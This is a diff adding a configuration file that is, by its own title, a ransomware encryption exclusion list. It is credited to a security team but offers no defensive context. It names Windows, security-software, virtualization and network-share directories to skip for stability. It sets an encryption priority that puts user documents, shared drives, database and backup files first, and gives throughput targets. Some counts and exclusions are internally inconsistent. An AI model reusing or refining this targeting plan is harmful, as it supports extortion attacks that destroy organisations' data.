@@ -1,0 +1,93 @@
+# Ransomware Encryption Exclusion List
+# Last Updated: 2023-10-15
+# Author: Security Operations Team
+# Purpose: Directories to skip during file encryption process to maintain system stability
+
+# Critical System Directories (DO NOT ENCRYPT)
+C:\Windows\
+C:\Windows\System32\
+C:\Windows\SysWOW64\
+C:\Program Files\
+C:\Program Files (x86)\
+C:\ProgramData\
+C:\$Recycle.Bin\
+C:\System Volume Information\
+C:\Boot\
+C:\Recovery\
+C:\PerfLogs\
+C:\Temp\
+C:\Windows.old\
+
+# Security Software Directories
+C:\Program Files\Symantec\
+C:\Program Files\McAfee\
+C:\Program Files\Trend Micro\
+C:\Program Files\CrowdStrike\
+C:\Program Files\SentinelOne\
+C:\ProgramData\Microsoft\Windows Defender\
+C:\Program Files\Windows Defender\
+
+# Network Share Exclusions (Critical Infrastructure)
+\\FS01\Finance\
+\\FS02\HR\
+\\FS03\Legal\
+\\FS01\Backup\
+\\DC01\NETLOGON\
+\\DC01\SYSVOL\
+\\FS04\DatabaseBackups\
+
+# Application Specific Exclusions
+C:\Oracle\
+C:\SQLServer\
+C:\Program Files\Microsoft SQL Server\
+C:\inetpub\
+C:\xampp\
+C:\wamp\
+C:\Apache24\
+C:\nginx\
+
+# Virtualization and Cloud Directories
+C:\Program Files\VMware\
+C:\Program Files\Oracle\VirtualBox\
+C:\Users\Public\Documents\Hyper-V\
+C:\ProgramData\Amazon\
+C:\Program Files\Amazon\
+
+# Development and Build Directories
+C:\Dev\
+C:\Build\
+C:\Source\
+C:\Git\
+C:\Jenkins\
+C:\AzureDevOps\
+
+# Temporary and Cache Directories
+C:\Users\*\AppData\Local\Temp\
+C:\Users\*\AppData\Local\Microsoft\Windows\INetCache\
+C:\Windows\Temp\
+C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Cache\
+
+# Exclusion Notes:
+# 1. These directories contain system-critical files
+# 2. Encrypting these may cause system instability
+# 3. Network shares marked as critical for business continuity
+# 4. Total excluded paths: 42 directories
+# 5. Estimated file count in excluded directories: ~15,000 files
+# 6. Last validation: 2023-10-14 by admin_jdoe
+
+# Monitoring directories (encrypt but log separately):
+\\FS05\UserShares\
+\\FS06\DepartmentShares\
+C:\Users\Public\Documents\
+C:\Shared\
+
+# Encryption priority order:
+# 1. User documents and personal files
+# 2. Departmental shared drives
+# 3. Database files (.mdf, .ldf, .bak)
+# 4. Configuration files (.config, .ini, .xml)
+# 5. Office documents (.docx, .xlsx, .pptx)
+
+# Expected encryption time per 100GB: 45-60 minutes
+# Current encryption speed: ~35 MB/sec
+# Target encryption speed: 100+ MB/sec
